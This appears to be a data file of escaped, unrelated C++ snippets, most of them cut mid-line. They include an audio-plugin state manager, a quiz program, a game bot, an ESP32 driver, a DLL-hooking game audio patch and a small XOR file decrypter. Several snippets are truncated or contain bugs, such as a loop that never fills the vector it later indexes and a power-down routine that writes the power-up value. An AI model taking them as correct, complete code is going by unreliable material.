= std::find(beg, end, text);\n                            if (it == end) {\n                                DBG(\"ERROR: Could not find text in PARAMETER_TO_STRING_ARRS\");\n                                return text.getFloatValue();\n                            }\n                            return float(it - beg);\n                        }\n                        return text.getFloatValue(); // Convert Back to Value\n                    }\n                )\n            );\n        }\n        else {\n            property_tree.setProperty(PARAMETER_IDS[p_id], PARAMETER_DEFAULTS[p_id], nullptr);\n            property_atomics[PARAMETER_NAMES[p_id]].store(PARAMETER_DEFAULTS[p_id]);\n        }\n        parameter_modified_flags[PARAMETER_NAMES[p_id]].store(false);\n    }\n\n    param_tree_ptr.reset(new juce::AudioProcessorValueTreeState(*proc, &undo_manager, PARAMETERS_ID, {params.begin(), params.end()}));\n    property_tree.addListener(this);\n    \n    for (size_t p_id = 0; p_id < PARAM::TOTAL_NUMBER_PARAMETERS; ++p_id) {\n        if (PARAMETER_AUTOMATABLE[p_id]) {\n            param_tree_ptr->addParameterListener(PARAMETER_NAMES[p_id], this);\n        }\n    }\n\n    //==============================================================================\n    //-> SETUP PRESETS\n    //==============================================================================\n    preset_tree = juce::ValueTree(PRESET_ID);\n    preset_tree.setProperty(PRESET_NAME_ID, DEFAULT_PRESET, nullptr);\n}\n\nStateManager::~StateManager(){\n    property_tree.removeListener(this);\n    for (size_t p_id = 0; p_id < PARAM::TOTAL_NUMBER_PARAMETERS; ++p_id) {\n        if (PARAMETER_AUTOMATABLE[p_id]) {\n            param_tree_ptr->removeParameterListener(PARAMETER_NAMES[p_id], this);\n        }\n    }\n}\n\n\nfloat StateManager::param_value(size_t param_id) {\n    // returns the parameter value of a certain ID in a thread safe way\n    if (PARAMETER_AUTOMATABLE[param_id]) {\n        return param_tree_ptr->getRawParameterValue(PARAMETER_NAMES[param_id])->load();\n    }\n    else {\n        return property_atomics[PARAMETER_NAMES[param_id]].load();\n    }\n}\n\njuce::AudioProcessorValueTreeState* StateManager::get_param_tree(){\n    return param_tree_ptr.get();\n}\n\njuce::ValueTree StateManager::get_property_tree",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <ctime>\r\n#include <cstdlib>\r\n#include <vector>\r\n#include <iomanip>\r\n#include <unordered_map>\r\n#include <algorithm>\r\n#include <stack>\r\n\r\nusing namespace std;\r\n\r\nclass QuestionPaper {\r\npublic:\r\n    struct Question {\r\n        string question;\r\n        string options[3];\r\n        int correctOption;\r\n    };\r\n\r\n    vector<Question> questions;\r\n\r\n    void loadQuestions(int subjectId) {\r\n        switch (subjectId) {\r\n            case 1: // Web Development\r\n                questions = {\r\n                    {\"What is a software application for accessing information on the world wide web?\",\r\n                     {\"1. Browser\", \"2. Server\", \"3. Laptop\"}, 1},\r\n                    {\"What is a computer that runs websites?\",\r\n                     {\"1. Web Browser\", \"2. Domain\", \"3. Server\"}, 3},\r\n                    {\"Is WWW an electronic communications network that connects computer networks and organization computer facilities around the world?\",\r\n                     {\"1. True\", \"2. False\", \"3. Not known\"}, 1},\r\n                    {\"Which of the following is used to write C++ programs?\",\r\n                     {\"1. Compiler\", \"2. Painter\", \"3. Text Editor\"}, 1},\r\n                    {\"What does CPU stand for?\",\r\n                     {\"1. Central Processing Unit\", \"2. Computer Personal Unit\", \"3. Central Processor Unit\"}, 1}\r\n                };\r\n                break;\r\n            case 2: // DBMS\r\n                questions = {\r\n                    {\"What does SQL stand for?\",\r\n                     {\"1. Structured Query Language\", \"2. Simple Query Language\", \"3. Strong Query Language\"}, 1},\r\n                    {\"Which of the following is a database management system?\",\r\n                     {\"1. MySQL\", \"2. HTML\", \"3. JSON\"}, 1},\r\n                    {\"What is a primary key?\",\r\n                     {\"1. A unique identifier for a record\", \"2. A foreign key\", \"3. An index\"}, 1},\r\n                    {\"Which command is used to update data in a database?\",\r\n                     {\"1. UPDATE\", \"2. INSERT\", \"3. SELECT\"}, 1},\r\n                    {\"What is normalization?\",\r\n                     {\"1. Organizing data to reduce redundancy\", \"2. Creating new databases\", \"3. Backing up data\"}, 1}\r\n                };\r\n                break;\r\n            // Add more cases for other subjects\r\n            default:\r\n                break;\r\n        }\r\n    }\r\n};\r\n\r\nclass Student {\r\npublic:\r\n    string name;\r\n    int marks;\r\n    string grade;\r\n    int certificateNumber;\r\n    int testId;\r\n\r\n    Student() : marks(0), certificateNumber(0), testId(0) {}\r\n\r\n    ~Student() {}\r\n\r\n    void calculateGrade() {\r\n        if (marks >= 80) {\r\n            grade = \"A\";\r\n        } else if (marks >= 60) {\r\n            grade = \"B\";\r\n        } else if (marks >= 40) {\r\n            grade = \"C\";\r\n        } else if (marks >= 20) {\r\n            grade = \"D\";\r\n        } else {\r\n            grade = \"Fail\";\r\n        }\r\n    }\r\n\r\n    void generateCertificateNumber() {\r\n        certificateNumber = rand() % 90000 + 10000;  // 5 digit random number\r\n    }\r\n\r\n    // Overloaded << operator for Student\r\n    friend ostream& operator<<(ostream &os, const Student &student) {\r\n        os << student.name << \"\\t\"\r\n           << student.marks << \"\\t\"\r\n           << student.grade << \"\\t\"\r\n           << student.certificateNumber << \"\\t\"\r\n           << student.testId << endl;\r\n        return os;\r\n    }\r\n\r\n    // Overloaded >> operator for Student\r\n    friend istream& operator>>(istream &is, Student &student) {\r\n        is >> student.name >> student.marks >> student.grade >> student.certificateNumber >> student.testId;\r\n        return is;\r\n    }\r\n};\r\n\r\nclass AVLTree {\r\npublic:\r\n    struct Node {\r\n        int key;\r\n        Node *left;\r\n        Node *right;\r\n        int height;\r\n    };\r\n\r\n    AVLTree() : root(nullptr) {}\r\n\r\n    ~AVLTree() {\r\n        destroy(root);\r\n    }\r\n\r\n    void insert(int key) {\r\n        root = insert(root, key);\r\n    }\r\n\r\n    void remove(int key) {\r\n        root = remove(root, key);\r\n    }\r\n\r\n    void inOrder() const {\r\n        inOrder(root);\r\n    }\r\n\r\nprivate:\r\n    Node *root;\r\n\r\n    Node *createNode(int key) {\r\n        Node *node = new Node();\r\n        node->key = key;\r\n        node->left = node->right = nullptr;\r\n        node->height = 1;\r\n        return node;\r\n    }\r\n\r\n    void destroy(Node *node) {\r\n        if (node) {\r\n            destroy(node->left);\r\n            destroy(node->right);\r\n            delete node;\r\n        }\r\n    }\r\n\r\n    int height(Node *N) {\r\n        return N == nullptr ? 0 : N->height;\r\n    }\r\n\r\n    int max(int a, int b) {\r\n        return (a > b) ? a : b;\r\n    }\r\n\r\n    Node *rightRotate(Node *y) {\r\n        Node *x = y->left;\r\n        Node *T2 = x->right;\r\n\r\n        x->right = y;\r\n        y->left = T2;\r\n\r\n        y->height = max(height(y->left), height(y->right)) + 1;\r\n        x->height = max(height(x->left), height(x->right)) + 1;\r\n\r\n        return x;\r\n    }\r\n\r\n    Node *leftR",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <map>\n#include <cmath>\n\nusing namespace std;\n\n/**\n * Auto-generated code below aims at helping you parse\n * the standard input according to the problem statement.\n **/\n\n //the most pressing moves has the higest value assigned to it so it will get picked first.\n //the most pressing moves are up, so least number of players get tripped\n enum Move { UP=3, LEFT=2, DOWN=1, RIGHT=0 };\n\n class Player {\n\nprivate:\n    int racetrack;\n    int player_pos;\n\n\nprivate:\n\n    // determine if the move the player wants to make will cause the player trip\n    bool TooCloseToObs(const int& obst_pos, const int& player_pos, int comm)\n    {\n        return obst_pos - (player_pos + comm) <= 0;\n    };\n\npublic:\n    Move GetRacePlayerMove(const string& racetrack, const int& player_pos)\n    {\n        \n        Move result;\n        int obstacle_pos;\n\n        //start from where the player is in the current iteration\n        for (int i = player_pos; i < racetrack.length(); ++i)\n        {\n            //find first the obstacle\n            if (racetrack[i] == '#')\n            {\n                obstacle_pos = i;\n                break;\n            }\n            \n        }\n\n        //get how far the player is from the obstacle\n        int cond = obstacle_pos - player_pos;\n\n        //while move is not picked, keep going\n        while (true)\n        {\n            //if distance from obstacle is greater than 3\n            if (cond >= 3)\n            {\n                //predict whether the player would trip over if player moved 3 spaces\n                if (!TooCloseToObs(obstacle_pos, player_pos, 3)) \n                {\n                    //if not, move 3 spaces, and end loop\n                    result = Move::RIGHT;\n                    break;\n                }\n                else {\n                    //if so, try moving 2 spaces instead, and so on\n                    cond = 2;\n                    continue;\n                }\n            }\n            else if (cond == 2)\n            {\n                if (!TooCloseToObs(obstacle_pos, player_pos, 2)) \n                {\n                    result = Move::DOWN;\n                    break;\n                }\n                else {\n                    cond = 1;\n                    continue;\n                }\n            }\n            else if (cond == 1)\n            {\n                if (!TooCloseToObs(obstacle_pos, player_pos, 1)) \n                {\n                    result = Move::LEFT;\n                    break;\n                }\n                else {\n                    result = Move::UP;\n                    break;\n                }\n            }\n            else\n            {\n                result = Move::RIGHT;\n                break;\n            }\n        }\n        \n        return result;\n    }\n\n    Move GetArchPlayerMove(const char& firstDigit, const int& playerX, const int& playerY)\n    {\n        int windPower = firstDigit -'0';\n        Move result;\n\n        map<Move,float> distances;\n        distances.emplace(Move::RIGHT, sqrt(pow(playerX+windPower,2)+pow(playerY,2)));\n        distances.emplace(Move::LEFT, sqrt(pow(playerX-windPower,2)+pow(playerY,2)));\n        distances.emplace(Move::UP, sqrt(pow(playerX,2)+pow(playerY-windPower,2)));\n        distances.emplace(Move::DOWN, sqrt(pow(playerX,2)+pow(playerY+windPower,2)));\n\n        for (auto it = distances.begin(); it != distances.end(); it++)\n        {\n            cerr << it->first << \": \" << it->second << endl;\n        }\n\n\n        auto mostFrequent = std::min_element(\n            distances.begin(), distances.end(),\n            [] (const std::pair<Move, float>& p1, const std::pair<Move, float>& p2)->bool{ \n                    return p1.second < p2.second;\n            } \n        );\n\n        result = mostFrequent->first;\n\n        return result;\n    }\n };\n\n\nint main()\n{\n    int player_idx;\n    cin >> player_idx; cin.ignore();\n    int nb_games;\n    cin >> nb_games; cin.ignore();\n\n    vector<Player> games;\n    for (int i = nb_games; i < nb_games; i++)\n    {\n        games.push_back(Player());\n    }\n\n    // game loop\n    while (1) {\n        for (int i = 0; i < 3; i++) {\n            string score_info;\n            getline(cin, score_info);\n        }\n\n        string current_game;\n\n        vector<int> playerStuns;\n        vector<Move> allMoves;\n\n        for (int i = 0; i < nb_games; i++) {\n            string gpu;\n            int reg_0;\n            int reg_1;\n            int reg_2;\n            int reg_3;\n            int reg_4;\n            int reg_5;\n            int reg_6;\n            cin >> gpu >> reg_0 >> reg_1 >> reg_2 >> reg_3 >> reg_4 >> reg_5 >> reg_6; cin.ignore();\n            current_game = gpu;\n\n            vector<int> info{reg_0, reg_1, reg_2, reg_3, reg_4, reg_5, reg_6};\n\n            if (i == 0){\n                \n                int player_pos = info[player_idx];\n                int player_stun = info[player_idx + 3];\n\n                allMoves.push_back(games[i].GetRac",
    "// Include header file.\n#include \"esp32SpiAt.h\"\n\n// Flag for the handshake for the ESP32. Use SPI MODE0, MSBFIRST data transfet with approx. SPI clock rate of 20MHz.\nstatic volatile bool _esp32HandshakePinFlag = false;\n\n// SPI Settings for ESP32.\nstatic SPISettings _esp32AtSpiSettings(20000000ULL, MSBFIRST, SPI_MODE0);\n\n// ISR for the ESP32 handshake pin. This will be called automatically from the interrupt.\nstatic void esp32HandshakeISR()\n{\n    _esp32HandshakePinFlag = true;\n}\n\n/**\n * @brief Construct a new Wi-Fi Class:: Wi Fi Class object\n *\n */\nWiFiClass::WiFiClass()\n{\n    // Empty...for now.\n}\n\n/**\n * @brief   Initializes ESP32-C3 Module. It powers up the module, sets it to factory\n *          settings, initializes WiFi radio and disables storing settings in NVM.\n *\n * @param   bool _resetSettings\n *          Setting this to true will reset all setting stored in NVM of the ESP32.\n *          This is optional parameter and by default, this parameter is set to true,\n *          but it can be overdriven.\n * @return  bool\n *          True - Initialization ok, ESP32 is ready.\n *          False - Initialization failed.\n */\nbool WiFiClass::init(bool _resetSettings)\n{\n    // Set the hardware level stuff first.\n\n    // Set the SPI pins.\n    SPI.setMISO(INKPLATE_ESP32_MISO_PIN);\n    SPI.setMOSI(INKPLATE_ESP32_MOSI_PIN);\n    SPI.setSCLK(INKPLATE_ESP32_SCK_PIN);\n\n    // Initialize Arduino SPI Library.\n    SPI.begin();\n\n    // Set handshake pin.\n    pinMode(INKPLATE_ESP32_HANDSHAKE_PIN, INPUT_PULLUP);\n\n    // Set interrupt on handshake pin.\n    attachInterrupt(digitalPinToInterrupt(INKPLATE_ESP32_HANDSHAKE_PIN), esp32HandshakeISR, RISING);\n\n    // Set SPI CS Pin.\n    pinMode(INKPLATE_ESP32_CS_PIN, OUTPUT);\n\n    // Disable ESP32 SPI for now.\n    digitalWrite(INKPLATE_ESP32_CS_PIN, HIGH);\n\n    // Set ESP32 power switch pin.\n    pinMode(INKPLATE_ESP32_PWR_SWITCH_PIN, OUTPUT);\n\n    // Try to power on the modem. Return false if failed.\n    if (!power(true, _resetSettings))\n        return false;\n\n    // If everything went ok, return true.\n    return true;\n}\n\n/**\n * @brief   Power up or powers down the ESP32 module.\n *\n * @param   bool _en\n *          true - Enable the ESP32 module.\n *          false - Disables the ESP32 module.\n * @param   bool _resetSettings\n *          Setting this to true will reset all setting stored in NVM of the ESP32.\n *          This is optional parameter and by default, this parameter is set to true,\n *          but it can be overdriven.\n * @return  bool\n *          true - Modem is successfully powered up.\n *          false - Modem failed to power up.\n */\nbool WiFiClass::power(bool _en, bool _resetSettings)\n{\n    if (_en)\n    {\n        // Enable the power to the ESP32.\n        digitalWrite(INKPLATE_ESP32_PWR_SWITCH_PIN, HIGH);\n\n        // Wait a little bit for the ESP32 to boot up.\n        delay(50);\n\n        // Wait for the EPS32 to be ready. It will send a handshake to notify master\n        // To read the data - \"\\r\\nready\\r\\n\" packet. Since the handshake pin pulled high\n        // with the external resistor, we need to wait for the handshake pin to go low first,\n        // then wait for the proper handshake event.\n        if (!isModemReady())\n            return false;\n\n        // Try to ping modem. Return fail if failed.\n        if (!modemPing())\n            return false;\n\n        // Set ESP32 to its factory settings if needed.\n        if (_resetSettings)\n        {\n            if (!systemRestore())\n                return false;\n        }\n\n        // Disable echo on command. Return false if failed.\n        if (!commandEcho(false))\n            return false;\n\n        // Enable default message filters.\n        if (!defaultMsgFiltersEn()) return false;\n\n        // Disable stroing data in NVM. Return false if failed.\n        if (!storeSettingsInNVM(false))\n            return false;\n\n        // Disable system messages. Can disrupt flow of the library.\n        if(!systemMessages(0))\n            return false;\n\n        // Initialize WiFi radio.\n        if (!wiFiModemInit(true))\n            return false;\n    }\n    else\n    {\n        // Disable the power to the ESP32.\n        digitalWrite(INKPLATE_ESP32_PWR_SWITCH_PIN, HIGH);\n\n        // Wait a little bit for the ESP32 to power down.\n        delay(50);\n    }\n\n    // Everything went ok? Return true.\n    return true;\n}\n\n/**\n * @brief   Methods sends AT command to the modem. It check if the modem is ready to accept the command or not.\n *\n * @param   char *_atCommand\n *          AT commnds that will be sent to the modem.\n * @param   uint16_t _len\n *          If the array is not null terminated, you can set the length parameter.\n *          This parameter is optional. If not set, array will be treated like nul terminated char array.\n * @return  bool\n *          true - AT Command is successfully sent.\n *          false - AT Command send failed (modem not ready to accept the command).\n * @note    AT Command needs to have CRLF at the and. method won't at it at th",
    "#include \"vector_visual.h\"\n\nnamespace decomp_rviz_plugins {\n  VectorVisual::VectorVisual(Ogre::SceneManager *scene_manager,\n                           Ogre::SceneNode *parent_node) {\n    scene_manager_ = scene_manager;\n    frame_node_ = parent_node->createChildSceneNode();\n  }\n\n  VectorVisual::~VectorVisual() { scene_manager_->destroySceneNode(frame_node_); }\n\n  void VectorVisual::setMessage(const vec_E<std::pair<Vec3f, Vec3f>> &vs) {\n    objs_.clear();\n    vs_ = vs;\n    if (vs.empty())\n      return;\n    objs_.resize(vs.size());\n    for (auto &it : objs_)\n      it.reset(new rviz::Arrow(scene_manager_, frame_node_));\n\n    int cnt = 0;\n    for (const auto &v : vs) {\n      Vec3f n = v.second.normalized();\n      objs_[cnt]->setDirection(Ogre::Vector3(n(0), n(1), n(2)));\n      objs_[cnt]->setPosition(Ogre::Vector3(v.first(0), v.first(1), v.first(2)));\n      objs_[cnt]->setScale(s_ * Ogre::Vector3(1.0, 1.0, 1.0));\n\n      float d = s_ * v.second.norm();\n      float shaft_length = 0.7 * d;\n      float head_length = 0.3 * d;\n      objs_[cnt]->set(shaft_length, d / 8, head_length, d / 5);\n      cnt ++;\n    }\n  }\n\n  void VectorVisual::setFramePosition(const Ogre::Vector3 &position) {\n    frame_node_->setPosition(position);\n  }\n\n  void VectorVisual::setFrameOrientation(const Ogre::Quaternion &orientation) {\n    frame_node_->setOrientation(orientation);\n  }\n\n  void VectorVisual::setColor(float r, float g, float b, float a) {\n    for (auto &it : objs_)\n      it->setColor(r, g, b, a);\n  }\n\n  void VectorVisual::setScale(float s) {\n    s_ = s;\n    for (unsigned int i = 0; i < objs_.size(); i++){\n      float d = s_ * vs_[i].second.norm();\n      float shaft_length = 0.7 * d;\n      float head_length = 0.3 * d;\n      objs_[i]->set(shaft_length, d / 8, head_length, d / 5);\n    }\n  }\n}\n",
    "// decrypter.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\n\nint main(int argc, char **argv)\n{\n    FILE* file = fopen( argv[ 1 ], \"rb\" );\n    if ( !file ) {\n        printf( \"failed to open file!\\n\" );\n        return 0;\n    }\n    fseek( file, 0, SEEK_END );\n    long file_size = ftell( file );\n    rewind( file );\n    char* metadata_buffer = ( char* )malloc( file_size * sizeof( char ) );\n    if ( !metadata_buffer ) {\n        printf( \"failed to allocate memory!\\n\" );\n        return 0;\n    }\n\n    fread( metadata_buffer, 1, file_size, file );\n    fclose( file );\n\n    char key[ 169 ];\n    strcpy( key, \"don't reverse me please <3\\\\na moy mal4ik na turbovom marke\\\\npo avtostrade vdol' no4nix stolbov\\\\nmi krujilish' bokom po razvyazke\\\\nsojgi devyatku i vse budet ok\" );\n    for ( long i = 0; i < file_size; ++i )\n    {\n        for ( int k = 0; k <= 158; ++k ) {\n            metadata_buffer[ i ] ^= key[ k ];\n        }\n    }\n\n    FILE* output_file = fopen( argv[ 2 ], \"wb\" );\n    fwrite( metadata_buffer, 1, file_size, output_file );\n    fclose( output_file );\n\n    printf( \"work finished\\n\" );\n    return 0;\n}",
    "#include \"PatchedAil.h\"\n#include \"ReMech2.h\"\n#include <algorithm>\n\nvoid(CALLBACK *PatchedAil::OriginalWaveOutProc)(HWAVEOUT hwo, UINT uMsg, DWORD_PTR dwInstance, DWORD_PTR dwParam1,\n                                                DWORD_PTR dwParam2);\nvoid *(WINAPI *PatchedAil::OriginalAilFileRead)(char *filename, void *dest);\nvoid(WINAPI *PatchedAil::OriginalAilMemFreeLock)(void *ptr);\nLPTIMECALLBACK PatchedAil::OriginalTimeProc;\n\nvolatile WAVEHDR **PatchedAil::pLastFinishedWaveHdr;\nvolatile WaveHdrUser **PatchedAil::pLastFinishedWaveHdrUser;\nvolatile unsigned int *PatchedAil::pWaveOutProcGlobalThing;\n\nvolatile DWORD *PatchedAil::pPeriod;\nvolatile DWORD *PatchedAil::pCounter;\nvolatile SomeTimerStruct **PatchedAil::pTimers;\nvolatile DWORD *PatchedAil::pGlobal3;\nvolatile BOOL *PatchedAil::pTimeProcLocked;\nvolatile DWORD *PatchedAil::pGlobal5;\nvolatile DWORD *PatchedAil::pNumTimers;\n\nsize_t PatchedAil::AILAllocatedBlocks[MAX_AIL_ALLOCATED_BLOCKS];\n\nPatchedAil::PatchedAil() {\n  if (Module != NULL) {\n    DebugLog(\"ERROR: Multiple PatchedAil objects created?\");\n    exit(1);\n  }\n\n  Module = GetModuleHandleA(\"WAIL32.DLL\");\n  if (Module == NULL) {\n    exit(1);\n  }\n\n  size_t baseAddress = (size_t)Module;\n\n  OriginalWaveOutProc = (void(CALLBACK *)(HWAVEOUT, UINT, DWORD_PTR, DWORD_PTR, DWORD_PTR))(baseAddress + 0x00008e6d);\n  OriginalAilFileRead = (void *(WINAPI *)(char *, void *))(baseAddress + 0x0000845f);\n  OriginalAilMemFreeLock = (void(WINAPI *)(void *))(baseAddress + 0x00001f14);\n  OriginalTimeProc = (LPTIMECALLBACK)(baseAddress + 0x000011c6);\n\n  pLastFinishedWaveHdr = (volatile WAVEHDR **)(baseAddress + 0x0001ba10);\n  pLastFinishedWaveHdrUser = (volatile WaveHdrUser **)(baseAddress + 0x0001ba0c);\n  pWaveOutProcGlobalThing = (unsigned int *)(baseAddress + 0x0001ba04);\n\n  pPeriod = (DWORD *)(baseAddress + 0x0001b7fc);\n  pCounter = (DWORD *)(baseAddress + 0x0001b810);\n  pTimers = (volatile SomeTimerStruct **)(baseAddress + 0x0001b7f8);\n  pGlobal3 = (DWORD *)(baseAddress + 0x0001b804);\n  pTimeProcLocked = (BOOL *)(baseAddress + 0x00019030);\n  pGlobal5 = (DWORD *)(baseAddress + 0x0001c59c);\n  pNumTimers = (DWORD *)(baseAddress + 0x0001b800);\n\n  // Clear allocated blocks\n  std::fill(std::begin(AILAllocatedBlocks), std::end(AILAllocatedBlocks), 0);\n\n  DetourTransactionBegin();\n  DetourAttach((PVOID *)(&OriginalWaveOutProc), WaveOutProc);\n  DetourAttach((PVOID *)(&OriginalAilFileRead), AilFileRead);\n  DetourAttach((PVOID *)(&OriginalAilMemFreeLock), AilMemFreeLock);\n  DetourAttach((PVOID *)(&OriginalTimeProc), TimeProc);\n  DetourTransactionCommit();\n}\n\nPatchedAil::~PatchedAil() {\n  DetourTransactionBegin();\n  DetourDetach((PVOID *)(&OriginalWaveOutProc), WaveOutProc);\n  DetourDetach((PVOID *)(&OriginalAilFileRead), AilFileRead);\n  DetourDetach((PVOID *)(&OriginalAilMemFreeLock), AilMemFreeLock);\n  DetourDetach((PVOID *)(&OriginalTimeProc), TimeProc);\n  DetourTransactionCommit();\n  FreeLibrary(Module);\n  Module = NULL;\n}\n\n// Replacement for AIL's waveOutOpen callback that doesn't try to suspend the main thread\nvoid CALLBACK PatchedAil::WaveOutProc(HWAVEOUT hwo, UINT uMsg, DWORD_PTR dwInstance, DWORD_PTR dwParam1,\n                                      DWORD_PTR dwParam2) {\n  if (uMsg == WOM_DONE) {\n    WAVEHDR *waveHdr = (WAVEHDR *)dwParam1;\n    *pLastFinishedWaveHdr = waveHdr;\n    if (waveHdr->dwUser != 0) {\n      *pLastFinishedWaveHdrUser = *(WaveHdrUser **)waveHdr->dwUser;\n      if ((*pLastFinishedWaveHdrUser)->unknown6 != 0) {\n        *pWaveOutProcGlobalThing = (*pLastFinishedWaveHdrUser)->unknown4;\n        *(WAVEHDR **)((*pLastFinishedWaveHdrUser)->unknown3 + *pWaveOutProcGlobalThing * 4) = waveHdr;\n        *pWaveOutProcGlobalThing = (*pWaveOutProcGlobalThing + 1) % (*pLastFinishedWaveHdrUser)->unknown2;\n        (*pLastFinishedWaveHdrUser)->unknown4 = *pWaveOutProcGlobalThing;\n      }\n    }\n  }\n}\n\nvoid *WINAPI PatchedAil::AilFileRead(char *filename, void *dest) {\n  void *result = OriginalAilFileRead(filename, dest);\n  if (dest == NULL) {\n    for (size_t i = 0; i < MAX_AIL_ALLOCATED_BLOCKS; i++) {\n      if (AILAllocatedBlocks[i] == NULL) {\n        AILAllocatedBlocks[i] = (size_t)result;\n        break;\n      }\n    }\n  }\n  return result;\n}\n\n// Only try to free blocks that we know haven't been freed yet\nvoid WINAPI PatchedAil::AilMemFreeLock(void *ptr) {\n  for (size_t i = 0; i < MAX_AIL_ALLOCATED_BLOCKS; i++) {\n    if (AILAllocatedBlocks[i] == (size_t)ptr) {\n      OriginalAilMemFreeLock(ptr);\n      AILAllocatedBlocks[i] = 0;\n      return;\n    }\n  }\n  return;\n}\n\n// Passed to timeSetEvent in AIL to handle timers\n// This also had calls to SuspendThread that needed to be removed\nvoid __stdcall PatchedAil::TimeProc(UINT uTimerID, UINT uMsg, DWORD_PTR dwUser, DWORD_PTR dw1, DWORD_PTR dw2) {\n  SomeTimerStruct *timers = (SomeTimerStruct *)*pTimers;\n  int NumTimers = *pNumTimers;\n\n  (*pCounter)++;\n\n  if (timers == NULL || *pGlobal3 > 0 || *pTimeProcLocked) {\n    return;\n  }\n\n  (*pTimeProcLocked) = TRUE;\n  (*pGlobal5)++;\n  for (in",
    "\ufeff#include <iostream>\nusing namespace std;\nconst int N = 3, M = 4;\nvoid print(int n, int m, int A[], int B[], int x[][M + 1], int c[][M + 1], int difa[] = NULL, int difb[] = NULL)\n{\n\tint i, j;\n\tfor (i = 0; i < n; i++)\n\t{\n\t\tfor (j = 0; j < m; j++)\n\t\t{\n\t\t\tcout << \"\\t\";\n\t\t\tif (x[i][j] == -2)\n\t\t\t\tcout << 0;\n\t\t\telse if (x[i][j] > 0)\n\t\t\t\tcout << x[i][j];\n\t\t\tcout << \"(\" << c[i][j] << \")\";\n\t\t}\n\t\tcout << \"\\t\" << A[i];\n\n\t\tif (difa != NULL)\n\t\t{\n\t\t\tcout << \"\\t| \";\n\t\t\tif (difa[i] != -1)\n\t\t\t\tcout << difa[i];\n\t\t\telse\n\t\t\t\tcout << \"-\";\n\t\t}\n\t\tcout << endl;\n\t}\n\tfor (i = 0; i < m; i++)\n\t\tcout << \"\\t\" << B[i];\n\tcout << endl;\n\n\tif (difb != NULL)\n\t{\n\t\tcout << \"\\t_\\t_\\t_\\t_\\t_\\n\";\n\t\tfor (i = 0; i < m; i++)\n\t\t{\n\t\t\tcout << \"\\t\";\n\t\t\tif (difb[i] != -1)\n\t\t\t\tcout << difb[i];\n\t\t\telse\n\t\t\t\tcout << \"-\";\n\t\t}\n\t\tcout << endl;\n\t}\n}\n\nvoid sort(int n, int A[])\n{\n\tint i, j, k, obm;\n\tfor (i = 0; i < n - 1; i++)\n\t{\n\t\tk = i;\n\t\tfor (j = i + 1; j < n; j++)\n\t\t{\n\t\t\tif (A[k] > A[j])\n\t\t\t\tk = j;\n\t\t}\n\t\tif (k != i)\n\t\t{\n\t\t\tobm = A[k];\n\t\t\tA[k] = A[i];\n\t\t\tA[i] = obm;\n\t\t}\n\t}\n}\n\nint minind(int i, int ind, int n, int c[][M + 1], int x[][M + 1], bool ver = false)\n{\n\tint j, k, * A = new int[n];\n\tfor (j = 0, k = 0; j < n; j++)\n\t{\n\t\tif (!ver)\n\t\t{\n\t\t\tif (x[i][j] == -1)\n\t\t\t{\n\t\t\t\tA[j] = c[i][j];\n\t\t\t\tk++;\n\t\t\t}\n\t\t\telse\n\t\t\t\tA[j] = -1;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tif (x[j][i] == -1)\n\t\t\t{\n\t\t\t\tA[j] = c[j][i];\n\t\t\t\tk++;\n\t\t\t}\n\t\t\telse\n\t\t\t\tA[j] = -1;\n\t\t}\n\t}\n\tif (k == 0)\n\t{\n\t\tdelete[] A;\n\t\treturn -1;\n\t}\n\n\tsort(n, A);\n\t/*for (j = 0; j < n; j++)\n\t\tcout << \" \" << A[j];\n\tcout << endl;*/\n\tif (k - 1 < ind)\n\t{\n\t\tdelete[] A;\n\t\treturn 0;\n\t}\n\tj = A[n - k + ind];\n\tdelete [] A;\n\treturn j;\n}\n\nint find(int i, int a, int n, int c[][M + 1], int x[][M + 1], bool ver = false)\n{\n\tint j;\n\tfor (j = 0; j < n; j++)\n\t{\n\t\tif ((!ver && (a == c[i][j]) && (x[i][j] == -1)) || (ver && (a == c[j][i]) && (x[j][i] == -1)))\n\t\t\treturn j;\n\t}\n\treturn -1;\n}\n\nint main()\n{\n\tsetlocale(LC_ALL, \"Russian\");\n\tint i, j, imin, jmin, min, max, iv, jv, n = N, m = M, s1 = 0, s2 = 0, difa[N + 1], difb[M + 1], x[N + 1][M + 1], c[N + 1][M + 1] =\n\t{\n\t\t/*13, 14, 12, 9, 11, 0,\n\t\t16, 17, 14, 12, 15, 0,\n\t\t18, 16, 15, 15, 16, 0,\n\t\t0, 0, 0, 0, 0, 0,*/\n\n\t\t/*12, 13, 11, 8, 10, 0,\n\t\t9, 10, 7, 5, 8, 0,\n\t\t10, 8, 7, 7, 8, 0,\n\t\t0, 0, 0, 0, 0, 0,*/\n\n\t\t0, 0, 0, 0, 0,\n\t\t0, 0, 0, 0, 0,\n\t\t0, 0, 0, 0, 0,\n\t\t0, 0, 0, 0, 0,\n\n\t\t/*1, 1, 1, 1, 0,\n\t\t1, 1, 1, 1, 0,\n\t\t1, 1, 1, 1, 0,\n\t\t0, 0, 0, 0, 0,*/\n\t};\n\t//int A[N + 1] = { 51, 46, 99 }, B[M + 1] = { 74, 23, 90, 49, 34 };\n\t//int A[N + 1] = { 88, 6, 92 }, B[M + 1] = { 32, 62, 54, 10, 78 };\n\tint A[N + 1] = { 0, 0, 0 }, B[M + 1] = { 0, 0, 0, 0 };\n\t//int A[N + 1] = { 2, 2, 2 }, B[M + 1] = { 1, 1, 1, 1 };\n\tbool f, ver;\n\tfor (i = 0; i <= N; i++)\n\t{\n\t\tfor (j = 0; j <= M; j++)\n\t\t\tx[i][j] = -1;\n\t}\n\tprint(n, m, A, B, x, c);\n\n\tfor (i = 0; i < N; i++)\n\t\ts1 += A[i];\n\tfor (i = 0; i < M; i++)\n\t\ts2 += B[i];\n\tif (s1 != s2)\n\t{\n\t\tcout << \" \u041c\u043e\u0434\u0435\u043b\u044c \u043e\u0442\u043a\u0440\u044b\u0442\u0430\u044f (\u0441\u0443\u043c\u043c\u0430\u0440\u043d\u044b\u0435 \u0437\u0430\u043f\u0430\u0441\u044b = \" << s1 << \", \u0441\u0443\u043c\u043c\u0430\u0440\u043d\u044b\u0435 \u043f\u043e\u0442\u0440\u0435\u0431\u043d\u043e\u0441\u0442\u0438 = \" << s2 << \").\\n\\n\";\n\t\tif (s1 > s2)\n\t\t{\n\t\t\tm++;\n\t\t\tB[M] = s1 - s2;\n\t\t}\n\t\telse if (s1 < 